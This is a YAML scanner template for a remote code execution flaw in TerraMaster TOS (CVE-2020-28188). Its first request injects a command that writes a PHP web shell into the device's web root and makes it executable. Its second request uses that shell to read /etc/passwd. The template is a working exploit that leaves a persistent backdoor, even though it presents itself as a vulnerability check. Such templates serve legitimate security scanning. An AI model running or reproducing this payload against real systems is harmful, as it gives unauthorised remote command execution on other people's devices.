id: cve-2020-28188
info:
  name: terramaster RCE CVE-2020-28188
  risk: High
params:
- root: '{{.BaseURL}}'
- exp: RandomString(4)
reference:
- links:
  - https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
requests:
- conclusions:
  - SetValue("isCreated", StatusCode() == 200 && StringSearch("body", "Service,DateTime,"))
  method: GET
  redirect: false
  url: '{{.root}}/include/makecvs.php?Event=http%7Cecho%20%22%3C%3Fphp%20echo%28passthru%28%5C%24_GET%5B%27cmd%27%5D%29%29%3B%3F%3E%22%20%3E%3E%20%2Fusr%2Fwww%2F{{.exp}}.php%20%26%26%20chmod%20%2Bx%20%2Fusr%2Fwww%2F{{.exp}}.php%7C%7C'
- conditions:
  - ValueOf("isCreated") == "true"
  detections:
  - StatusCode() == 200 && StringSearch("body", "root:") && StringSearch("body", "bin/bash")
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  method: GET
  redirect: false
  url: '{{.root}}/{{.exp}}.php?cmd=cat%20/etc/passwd'
single: true
